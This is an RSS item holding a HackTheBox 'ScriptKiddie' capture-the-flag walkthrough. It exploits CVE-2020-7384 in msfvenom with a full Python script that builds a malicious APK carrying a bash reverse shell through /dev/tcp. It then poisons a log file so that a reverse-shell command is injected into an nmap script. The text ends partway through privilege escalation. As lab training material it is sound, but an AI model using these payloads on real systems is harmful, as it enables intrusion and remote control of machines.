<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>CVE-2020-7384 on Ef&#39;s log</title>
    <link>https://fahmifj.github.io/tags/cve-2020-7384/</link>
    <description>Recent content in CVE-2020-7384 on Ef&#39;s log</description>
    <generator>Hugo -- gohugo.io</generator>
    <lastBuildDate>Mon, 14 Jun 2021 07:57:37 +0700</lastBuildDate><atom:link href="https://fahmifj.github.io/tags/cve-2020-7384/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>HackTheBox - ScriptKiddie</title>
      <link>https://fahmifj.github.io/hackthebox/scriptkiddie/</link>
      <pubDate>Mon, 14 Jun 2021 07:57:37 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/hackthebox/scriptkiddie/</guid>
      <description>Exploiting exploitation tools and command injection in a log file</description>
      <content:encoded><![CDATA[<p>ScriptKiddie is all about exploiting exploitation tools. It starts by exploiting <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=2020-7384">CVE-2020-7384</a>, allows me to gain a foothold by crafting a malicious APK that executes a reverse shell when used as APK template on <code>msfvenom</code>. There is a script which automatically runs a <code>nmap</code> scan against a host from a log file. The script can be exploited by poisoning the log with a reverse shell. For the last part, a sudo privilege on <code>msfconsole</code>  can be leveraged to gain a root access.</p>
<h4 id="skills-learned">Skills Learned</h4>
<ul>
<li>Exploiting Metasploit CVE-2020-7384</li>
<li>Log poisoning</li>
<li>Sudo exploitation on msfconsole</li>
</ul>
<h4 id="tools">Tools</h4>
<ul>
<li>Nmap</li>
<li><a href="https://github.com/justinsteven/advisories/blob/master/2020_metasploit_msfvenom_apk_template_cmdi.md">CVE-2020-7384 PoC</a></li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<p>Full port scan with <code>nmap</code> discovers two open ports: SSH on port 22, and UPnP on port 5000</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «scriptkiddie» «10.10.14.31» 
</span></span><span class="line"><span class="cl">$ nmap -p- --min-rate <span class="m">1000</span> --reason -oA nmap/10-tcp-allport 10.10.10.226 
</span></span><span class="line"><span class="cl">Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-06-13 20:42 EDT
</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.10.10.226
</span></span><span class="line"><span class="cl">Host is up, received echo-reply ttl <span class="m">63</span> <span class="o">(</span>0.065s latency<span class="o">)</span>.
</span></span><span class="line"><span class="cl">Not shown: <span class="m">65533</span> closed ports
</span></span><span class="line"><span class="cl">Reason: <span class="m">65533</span> resets
</span></span><span class="line"><span class="cl">PORT     STATE SERVICE REASON
</span></span><span class="line"><span class="cl">22/tcp   open  ssh     syn-ack ttl <span class="m">63</span>
</span></span><span class="line"><span class="cl">5000/tcp open  upnp    syn-ack ttl <span class="m">63</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 45.79 seconds
</span></span></code></pre></div><p>With default script scan, <code>nmap</code> identifies that port 5000 is actually a web application hosted using Python.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «scriptkiddie» «10.10.14.31» 
</span></span><span class="line"><span class="cl">$ nmap -p22,5000 -sC -sV -oA nmap/10-tcp-allport-script 10.10.10.226
</span></span><span class="line"><span class="cl">Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-06-13 20:44 EDT
</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.10.10.226
</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.056s latency<span class="o">)</span>.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">PORT     STATE SERVICE VERSION
</span></span><span class="line"><span class="cl">22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
</span></span><span class="line"><span class="cl">5000/tcp open  http    Werkzeug httpd 0.16.1 <span class="o">(</span>Python 3.8.5<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Werkzeug/0.16.1 Python/3.8.5
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: k1d<span class="err">&#39;</span><span class="m">5</span> h4ck3r t00l5
</span></span><span class="line"><span class="cl">Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 11.66 second
</span></span></code></pre></div><h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-5000---website">TCP 5000 - Website</h3>
<p>The site provides several online hacking tools.</p>
<p><div class="img-container"><img src="imgs/image-20210614081410024.png" alt="image-20210614081410024"  /></div>
</p>
<p>The <code>nmap</code> tool can be used to scan against itself.</p>
<p><div class="img-container"><img src="imgs/image-20210614081542603.png" alt="image-20210614081542603"  /></div>
</p>
<p>The IP field doesn&rsquo;t accept others inputs except IPv4, so I don&rsquo;t thing it can be abused, but I&rsquo;ll note the <code>nmap</code> version.</p>
<p>The next tool is <code>msfvenom</code>, it can be used to generate a reverse shell binary.  It has three options on the OS: Windows, Linux and Android. There is also a template option, for example, you can embed your payload to Windows&rsquo;s <code>calc.exe</code>.</p>
<p><div class="img-container"><img src="imgs/image-20210614082411239.png" alt="image-20210614082411239"  /></div>
</p>
<p>Somehow, it can only generate payload for Windows and Android.</p>
<p><div class="img-container"><img src="imgs/image-20210614082153746.png" alt="image-20210614082153746"  /></div>
</p>
<p>The payload is available for 5 mins at <code>http://10.10.10.226:5000/static/payloads/[here]</code>.</p>
<p>The last tool is <code>searchsploit</code>, I tried to stack the commands but it returned this message.</p>
<p><div class="img-container"><img src="imgs/image-20210614083303308.png" alt="image-20210614083303308"  /></div>
</p>
<h3 id="finding-tools-vulnerabilities">Finding Tools Vulnerabilities</h3>
<p>I can&rsquo;t get the tools version except for <code>nmap</code>, so I searched some exploits around before the box release date (February 2021) on Exploit-DB  and here is what I found.</p>
<p><div class="img-container"><img src="imgs/image-20210614084800963.png" alt="image-20210614084800963"  /></div>
</p>
<p>And that is probably what I need.</p>
<p>I typed &ldquo;msfvenom&rdquo; on the site too, and the exploit also appeared there.</p>
<p><div class="img-container"><img src="imgs/image-20210614085320477.png" alt="image-20210614085320477"  /></div>
</p>
<h2 id="foothold">Foothold</h2>
<h3 id="shell-as-kid">Shell as kid</h3>
<h4 id="mfvenom-cve-2020-7384">Mfvenom CVE-2020-7384</h4>
<p>I&rsquo;ll use <a href="https://github.com/justinsteven/advisories/blob/master/2020_metasploit_msfvenom_apk_template_cmdi.md">this exploit</a>, but I&rsquo;ll change the payload and the template location to my current working directory.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python3</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">subprocess</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">tempfile</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">base64</span> <span class="kn">import</span> <span class="n">b32encode</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Change me</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;bash -c &#34;bash -i &gt;&amp; /dev/tcp/10.10.14.31/9000 0&gt;&amp;1&#34;&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># b32encode to avoid badchars (keytool is picky)</span>
</span></span><span class="line"><span class="cl"><span class="c1"># thanks to @fdellwing for noticing that base64 can sometimes break keytool</span>
</span></span><span class="line"><span class="cl"><span class="c1"># &lt;https://github.com/justinsteven/advisories/issues/2&gt;</span>
</span></span><span class="line"><span class="cl"><span class="n">payload_b32</span> <span class="o">=</span> <span class="n">b32encode</span><span class="p">(</span><span class="n">payload</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">dname</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;CN=&#39;|echo </span><span class="si">{</span><span class="n">payload_b32</span><span class="si">}</span><span class="s2"> | base32 -d | sh #&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[+] Manufacturing evil apkfile&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Payload: </span><span class="si">{</span><span class="n">payload</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;-dname: </span><span class="si">{</span><span class="n">dname</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">tmpdir</span> <span class="o">=</span> <span class="s2">&#34;./&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">apk_file</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">tmpdir</span><span class="p">,</span> <span class="s2">&#34;evil.apk&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">empty_file</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">tmpdir</span><span class="p">,</span> <span class="s2">&#34;empty&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">keystore_file</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">tmpdir</span><span class="p">,</span> <span class="s2">&#34;signing.keystore&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">storepass</span> <span class="o">=</span> <span class="n">keypass</span> <span class="o">=</span> <span class="s2">&#34;password&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">key_alias</span> <span class="o">=</span> <span class="s2">&#34;signing.key&#34;</span>
</span></span><span class="line"><span class="cl"><span class="nb">open</span><span class="p">(</span><span class="n">empty_file</span><span class="p">,</span> <span class="s2">&#34;w&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">subprocess</span><span class="o">.</span><span class="n">check_call</span><span class="p">([</span><span class="s2">&#34;zip&#34;</span><span class="p">,</span> <span class="s2">&#34;-j&#34;</span><span class="p">,</span> <span class="n">apk_file</span><span class="p">,</span> <span class="n">empty_file</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">subprocess</span><span class="o">.</span><span class="n">check_call</span><span class="p">([</span><span class="s2">&#34;keytool&#34;</span><span class="p">,</span> <span class="s2">&#34;-genkey&#34;</span><span class="p">,</span> <span class="s2">&#34;-keystore&#34;</span><span class="p">,</span> <span class="n">keystore_file</span><span class="p">,</span> <span class="s2">&#34;-alias&#34;</span><span class="p">,</span> <span class="n">key_alias</span><span class="p">,</span> <span class="s2">&#34;-storepass&#34;</span><span class="p">,</span> <span class="n">storepass</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                       <span class="s2">&#34;-keypass&#34;</span><span class="p">,</span> <span class="n">keypass</span><span class="p">,</span> <span class="s2">&#34;-keyalg&#34;</span><span class="p">,</span> <span class="s2">&#34;RSA&#34;</span><span class="p">,</span> <span class="s2">&#34;-keysize&#34;</span><span class="p">,</span> <span class="s2">&#34;2048&#34;</span><span class="p">,</span> <span class="s2">&#34;-dname&#34;</span><span class="p">,</span> <span class="n">dname</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="n">subprocess</span><span class="o">.</span><span class="n">check_call</span><span class="p">([</span><span class="s2">&#34;jarsigner&#34;</span><span class="p">,</span> <span class="s2">&#34;-sigalg&#34;</span><span class="p">,</span> <span class="s2">&#34;SHA1withRSA&#34;</span><span class="p">,</span> <span class="s2">&#34;-digestalg&#34;</span><span class="p">,</span> <span class="s2">&#34;SHA1&#34;</span><span class="p">,</span> <span class="s2">&#34;-keystore&#34;</span><span class="p">,</span> <span class="n">keystore_file</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                       <span class="s2">&#34;-storepass&#34;</span><span class="p">,</span> <span class="n">storepass</span><span class="p">,</span> <span class="s2">&#34;-keypass&#34;</span><span class="p">,</span> <span class="n">keypass</span><span class="p">,</span> <span class="n">apk_file</span><span class="p">,</span> <span class="n">key_alias</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[+] Done! apkfile is at </span><span class="si">{</span><span class="n">apk_file</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Do: msfvenom -x </span><span class="si">{</span><span class="n">apk_file</span><span class="si">}</span><span class="s2"> -p android/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -o /dev/null&#34;</span><span class="p">)</span>
</span></span></code></pre></div><p>It produces a file called <code>evil.apk</code> and it also shows the exploit commands.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «exploits» «10.10.14.31»
</span></span><span class="line"><span class="cl">$ python3 exploit_msfvenom.py
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Manufacturing evil apkfile
</span></span><span class="line"><span class="cl">Payload: bash -c <span class="s2">&#34;bash -i &gt;&amp; /dev/tcp/10.10.14.31/9000 0&gt;&amp;1&#34;</span>
</span></span><span class="line"><span class="cl">-dname: <span class="nv">CN</span><span class="o">=</span><span class="s1">&#39;|echo MJQXG2BAFVRSAITCMFZWQIBNNEQD4JRAF5SGK5RPORRXALZRGAXDCMBOGE2C4MZRF44TAMBQEAYD4JRREI====== | base32 -d | sh #
</span></span></span><span class="line"><span class="cl"><span class="s1">
</span></span></span><span class="line"><span class="cl"><span class="s1">  adding: empty (stored 0%)
</span></span></span><span class="line"><span class="cl"><span class="s1">jar signed.
</span></span></span><span class="line"><span class="cl"><span class="s1">
</span></span></span><span class="line"><span class="cl"><span class="s1">Warning:
</span></span></span><span class="line"><span class="cl"><span class="s1">The signer&#39;</span>s certificate is self-signed.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Done! apkfile is at ./evil.apk
</span></span><span class="line"><span class="cl">Do: msfvenom -x ./evil.apk -p android/meterpreter/reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>127.0.0.1 <span class="nv">LPORT</span><span class="o">=</span><span class="m">4444</span> -o /dev/null
</span></span></code></pre></div><h4 id="reverse-shell---kid">Reverse shell - kid</h4>
<p>I&rsquo;ll setup a <code>nc</code> listener on port 9000, then I&rsquo;ll upload the <code>evil.apk</code> file as the template file and then I&rsquo;ll click on the generate button.</p>
<p><div class="img-container"><img src="imgs/image-20210614103158432.png" alt="image-20210614103158432"  /></div>
</p>
<p>On my listener, I&rsquo;ve a shell now as user <code>kid</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"> root@kali «exploits» «10.10.14.31» 
</span></span><span class="line"><span class="cl">$ nc -nvlp <span class="m">9000</span>
</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">9000</span> ...
</span></span><span class="line"><span class="cl">connect to <span class="o">[</span>10.10.14.31<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.226<span class="o">]</span> <span class="m">34230</span>
</span></span><span class="line"><span class="cl">bash: cannot <span class="nb">set</span> terminal process group <span class="o">(</span>897<span class="o">)</span>: Inappropriate ioctl <span class="k">for</span> device
</span></span><span class="line"><span class="cl">bash: no job control in this shell
</span></span><span class="line"><span class="cl">kid@scriptkiddie:~/html$    
</span></span></code></pre></div><p><div class="img-container"><img src="imgs/image-20210614102941088.png" alt="image-20210614102941088"  /></div>
</p>
<h4 id="shell-upgrade">Shell upgrade</h4>
<p>I&rsquo;ll upgrade my shell first.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">kid@scriptkiddie:~/html$ <span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm
</span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm
</span></span><span class="line"><span class="cl">kid@scriptkiddie:~/html$ which python
</span></span><span class="line"><span class="cl">which python
</span></span><span class="line"><span class="cl">kid@scriptkiddie:~/html$ python3 -c <span class="s1">&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
</span></span><span class="line"><span class="cl">python3 -c <span class="s1">&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
</span></span><span class="line"><span class="cl">kid@scriptkiddie:~/html$ ^Z
</span></span><span class="line"><span class="cl"><span class="o">[</span>1<span class="o">]</span>  + <span class="m">10652</span> suspended  nc -nvlp <span class="m">9000</span>
</span></span><span class="line"><span class="cl">→ root@kali «exploits» «10.10.14.31» 
</span></span><span class="line"><span class="cl">$ stty raw -echo<span class="p">;</span> <span class="nb">fg</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>1<span class="o">]</span>  + <span class="m">10652</span> continued  nc -nvlp <span class="m">9000</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">kid@scriptkiddie:~/html$ 
</span></span></code></pre></div><p>User flag is done here.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">kid@scriptkiddie:~/html$ <span class="nb">cd</span> ~
</span></span><span class="line"><span class="cl">kid@scriptkiddie:~$ ls -la
</span></span><span class="line"><span class="cl">total <span class="m">60</span>
</span></span><span class="line"><span class="cl">...&lt;SNIP&gt;...
</span></span><span class="line"><span class="cl">-rw-r--r--  <span class="m">1</span> kid  kid   <span class="m">807</span> Feb <span class="m">25</span>  <span class="m">2020</span> .profile
</span></span><span class="line"><span class="cl">drwx------  <span class="m">2</span> kid  kid  <span class="m">4096</span> Feb <span class="m">10</span> 16:11 .ssh
</span></span><span class="line"><span class="cl">-rw-r--r--  <span class="m">1</span> kid  kid     <span class="m">0</span> Jan  <span class="m">5</span> 11:10 .sudo_as_admin_successful
</span></span><span class="line"><span class="cl">drwxrwxr-x  <span class="m">5</span> kid  kid  <span class="m">4096</span> Feb  <span class="m">3</span> 11:03 html
</span></span><span class="line"><span class="cl">drwxrwxrwx  <span class="m">2</span> kid  kid  <span class="m">4096</span> Feb  <span class="m">3</span> 07:40 logs
</span></span><span class="line"><span class="cl">drwxr-xr-x  <span class="m">3</span> kid  kid  <span class="m">4096</span> Feb  <span class="m">3</span> 11:48 snap
</span></span><span class="line"><span class="cl">-r--------  <span class="m">1</span> kid  kid    <span class="m">33</span> Jun <span class="m">12</span> 11:35 user.txt
</span></span></code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-pwn">Shell as pwn</h3>
<h4 id="internal-enumeration">Internal Enumeration</h4>
<p>On kid&rsquo;s home, there&rsquo;s a folder called <code>logs</code>. The <code>logs</code> folder contains one file called <code>hackers</code>, but the content is empty.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">kid@scriptkiddie:~/logs$ ls -la
</span></span><span class="line"><span class="cl">total <span class="m">8</span>
</span></span><span class="line"><span class="cl">drwxrwxrwx  <span class="m">2</span> kid kid <span class="m">4096</span> Feb  <span class="m">3</span> 07:40 .
</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">11</span> kid kid <span class="m">4096</span> Feb  <span class="m">3</span> 11:49 ..
</span></span><span class="line"><span class="cl">-rw-rw-r--  <span class="m">1</span> kid pwn    <span class="m">0</span> Jun <span class="m">14</span> 01:40 hackers
</span></span></code></pre></div><p>I did a quick check on the available users who have shells.  It looks like I need to escalate to <code>pwn</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">kid@scriptkiddie:~$ cat /etc/passwd <span class="p">|</span> grep sh$
</span></span><span class="line"><span class="cl">root:x:0:0:root:/root:/bin/bash
</span></span><span class="line"><span class="cl">kid:x:1000:1000:kid:/home/kid:/bin/bash
</span></span><span class="line"><span class="cl">pwn:x:1001:1001::/home/pwn:/bin/bash
</span></span></code></pre></div><p>Searching files owned by user <code>pwn</code> discovers one script called <code>scanlosers.sh</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">kid@scriptkiddie:~$ find / -type f -user pwn 2&gt;/dev/null
</span></span><span class="line"><span class="cl">/home/pwn/.bash_logout
</span></span><span class="line"><span class="cl">/home/pwn/.selected_editor
</span></span><span class="line"><span class="cl">/home/pwn/.bashrc
</span></span><span class="line"><span class="cl">/home/pwn/.profile
</span></span><span class="line"><span class="cl">/home/pwn/scanlosers.sh
</span></span></code></pre></div><p>The script is writable by me.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">kid@scriptkiddie:~$ ls -l /home/pwn/scanlosers.sh
</span></span><span class="line"><span class="cl">-rwxrwxr-- <span class="m">1</span> pwn pwn <span class="m">250</span> Jan <span class="m">28</span> 17:57 /home/pwn/scanlosers.sh
</span></span></code></pre></div><h4 id="script-analysis">Script analysis</h4>
<p>The script is most likely linked with kid&rsquo;s hack tools website and probably can be abused by stacking commands, but I need to find how the log in <code>hackers</code> file is formatted.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">kid@scriptkiddie:~$ cat /home/pwn/scanlosers.sh
</span></span><span class="line"><span class="cl"><span class="c1">#!/bin/bash</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">## Define log</span>
</span></span><span class="line"><span class="cl"><span class="nv">log</span><span class="o">=</span>/home/kid/logs/hackers 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">cd</span> /home/pwn/
</span></span><span class="line"><span class="cl">cat <span class="nv">$log</span> <span class="p">|</span> cut -d<span class="s1">&#39; &#39;</span> -f3- <span class="p">|</span> sort -u <span class="p">|</span> <span class="k">while</span> <span class="nb">read</span> ip<span class="p">;</span> <span class="k">do</span>
</span></span><span class="line"><span class="cl">    sh -c <span class="s2">&#34;nmap --top-ports 10 -oN recon/</span><span class="si">${</span><span class="nv">ip</span><span class="si">}</span><span class="s2">.nmap </span><span class="si">${</span><span class="nv">ip</span><span class="si">}</span><span class="s2"> 2&gt;&amp;1 &gt;/dev/null&#34;</span> <span class="p">&amp;</span>
</span></span><span class="line"><span class="cl"><span class="k">done</span>
</span></span><span class="line"><span class="cl"><span class="c1">## The log is cleared immediately</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="o">[[</span> <span class="k">$(</span>wc -l &lt; <span class="nv">$log</span><span class="k">)</span> -gt <span class="m">0</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then</span> <span class="nb">echo</span> -n &gt; <span class="nv">$log</span><span class="p">;</span> <span class="k">fi</span>
</span></span></code></pre></div><p>Looking at the source code of the hosted web, it turns out that the log record consists of date and IP address. The logging happens when someone trying to insert a malicious input to the kid&rsquo;s hack tools.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="o">...&lt;</span><span class="n">SNIP</span><span class="o">&gt;...</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">searchsploit</span><span class="p">(</span><span class="n">text</span><span class="p">,</span> <span class="n">srcip</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">regex_alphanum</span><span class="o">.</span><span class="n">match</span><span class="p">(</span><span class="n">text</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">result</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">check_output</span><span class="p">([</span><span class="s1">&#39;searchsploit&#39;</span><span class="p">,</span> <span class="s1">&#39;--color&#39;</span><span class="p">,</span> <span class="n">text</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">&#39;index.html&#39;</span><span class="p">,</span> <span class="n">searchsploit</span><span class="o">=</span><span class="n">result</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;UTF-8&#39;</span><span class="p">,</span> <span class="s1">&#39;ignore&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;/home/kid/logs/hackers&#39;</span><span class="p">,</span> <span class="s1">&#39;a&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;[</span><span class="si">{</span><span class="n">datetime</span><span class="o">.</span><span class="n">datetime</span><span class="o">.</span><span class="n">now</span><span class="p">()</span><span class="si">}</span><span class="s1">] </span><span class="si">{</span><span class="n">srcip</span><span class="si">}</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">&#39;index.html&#39;</span><span class="p">,</span> <span class="n">sserror</span><span class="o">=</span><span class="s2">&#34;stop hacking me - well hack you back&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="o">...&lt;</span><span class="n">SNIP</span><span class="o">&gt;...</span>
</span></span></code></pre></div><p>For example, I can trigger an event that logs my IP in the <code>hackers</code> log file by inserting <code>-v apache</code>.</p>
<p><div class="img-container"><img src="imgs/image-20210614114025066.png" alt="image-20210614114025066"  /></div>
</p>
<p>Or I could generate the same log format in one line:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «exploits» «10.10.14.31»
</span></span><span class="line"><span class="cl">$ python3 -c <span class="s2">&#34;from datetime import datetime; print(f&#39;[{datetime.now()}] 127.0.0.1&#39;)&#34;</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>2021-06-14 00:43:54.924946<span class="o">]</span> 127.0.0.1
</span></span></code></pre></div><p>I could guess that the <code>scanlosers.sh</code> is intended as a &lsquo;counter attack&rsquo;. From here, I know that <code>scanlosers.sh</code> will be <strong>executed automatically</strong>.</p>
<p>To exploit the script, I have to trick this line from <code>scanlosers.sh</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="nb">echo</span> <span class="nv">$log</span> <span class="p">|</span> cut -d<span class="s1">&#39; &#39;</span> -f3- <span class="p">|</span> sort -u
</span></span></code></pre></div><p>What that line does is it extracts the IP address from the log.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «exploits» «10.10.14.31»
</span></span><span class="line"><span class="cl">$ <span class="nv">log</span><span class="o">=</span><span class="s1">&#39;[2021-06-14 00:28:09.560444] 127.0.0.1&#39;</span>
</span></span><span class="line"><span class="cl">→ root@kali «exploits» «10.10.14.31»
</span></span><span class="line"><span class="cl">$ <span class="nb">echo</span> <span class="nv">$log</span> <span class="p">|</span> cut -d<span class="s1">&#39; &#39;</span> -f3- <span class="p">|</span> sort -u
</span></span><span class="line"><span class="cl">127.0.0.1
</span></span></code></pre></div><p>From here, I&rsquo;ll just add a semi-colon and a space before putting my reverse shell.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">[2021-06-14 00:28:09.560444] 127.0.0.1; bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.14.30/9000 0&gt;&amp;1&#39;;
</span></span></code></pre></div><p>It becomes a stacked command.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «exploits» «10.10.14.31»
